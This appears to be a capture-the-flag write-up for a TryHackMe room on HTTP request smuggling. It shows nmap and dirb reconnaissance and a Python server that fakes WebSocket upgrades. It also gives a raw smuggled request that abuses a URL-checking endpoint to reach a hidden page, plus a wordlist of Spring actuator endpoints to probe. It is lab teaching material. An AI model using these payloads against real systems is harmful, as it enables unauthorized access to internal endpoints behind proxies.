---
title: El Bandito 
description: "A TryHackMe room that assesses skills set on HTTP Request Smuggling vulnerabilities."
date: "2026-02-y"
headerImage: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsYFeaQyaoRJL438huHhsCJEPsKYPR4TiNYxEPO3wE01wozK-dyjBL8pSatZ4YyObINdc&usqp=CAU"
tags: Web App Security
---


## URL — https://tryhackme.com/room/elbandito

## VIDEO

## ENUMERATION
1. Run nmap scan against the target `nmap -sV -A -p- bandito.thm`
  
<img width="1057" height="861" alt="Screenshot 2026-03-13 012839" src="https://github.com/user-attachments/assets/012a6e4b-eea6-4872-ba74-918ddaebbe8e" />

-> Open ports: 22, 80, 631, 8080

2. Run `dirb` to enumerate directories on port 80: `dirb https://bandito.thm:80`

<img width="697" height="674" alt="Screenshot 2026-03-13 013139" src="https://github.com/user-attachments/assets/e82c9d49-8a41-4203-9df8-0ea7b9fead87" />

3. Run `dirb` to enumerate directories on port 8080: `dirb http://bandito.thm:8080`

<img width="717" height="642" alt="Screenshot 2026-03-13 013426" src="https://github.com/user-attachments/assets/1f2d62f9-5e3a-41ca-9a71-557099bb092f" />

## Flag 1
1. Set up a fake server that always responds `101 Switching Protocol` status code `nano server.py` 

```
from http.server import BaseHTTPRequestHandler, HTTPServer

class FakeWebSocketHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(101)  # Fake successful upgrade
        self.send_header('Upgrade', 'websocket')
        self.send_header('Connection', 'Upgrade')
        self.end_headers()

server = HTTPServer(('0.0.0.0', 5555), FakeWebSocketHandler)
print("[+] Fake WebSocket server running on port 5555")
server.serve_forever()
```

2. Start the listener `python3 server.py`
4. Intercept a request to the home page -> send it to **Repeater**
5. Paste the following request payload to the **Repeater** (Make sure to leave two new lines at the end)

```
GET /isOnline?url=http://10.65.84.87:5555 HTTP/1.1
Host: bandito.thm:8080
Sec-WebSocket-Extensions: permessage-deflate
Sec-WebSocket-Key: 0FUnln2Ue4zNvQoqFC2sPw==
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
Content-Length: 0

GET /burn.html HTTP/1.1
Host: bandito.thm:8080


```

6. Disable the "Update Content-Length" feature on Burp Suites.
7. Send the request. We should be able to view `burn.html`
8. Try to burn a token, we get error. Also, from here we learn the application is using Java Spring framework.
9. Google Spring framework and we get a list of potential endpoints to exploit:

<details>
  <summary>Spring framework endpoints</summary>
   actuator
health
info
metrics
mappings
beans
env
configprops
caches
loggers
threaddump
heapdump
shutdown
auditevents
conditions
scheduledtasks
httptrace
flyway
liquibase
prometheus

api
v1
v2
v3
rest
graphql
admin
management
manage
config
settings
status

login
logout
register
signup
auth
authenticate
oauth
token
refresh
session

users
user
accounts
account
profile
profiles
roles
permissions
groups
admins

products
orders
cart
checkout
payments
billing
invoices
transactions

search
query
reports
analytics
stats
dashboard

upload
download
files
attachments
media
images

notifications
messages
comments
posts
feeds 
</details>


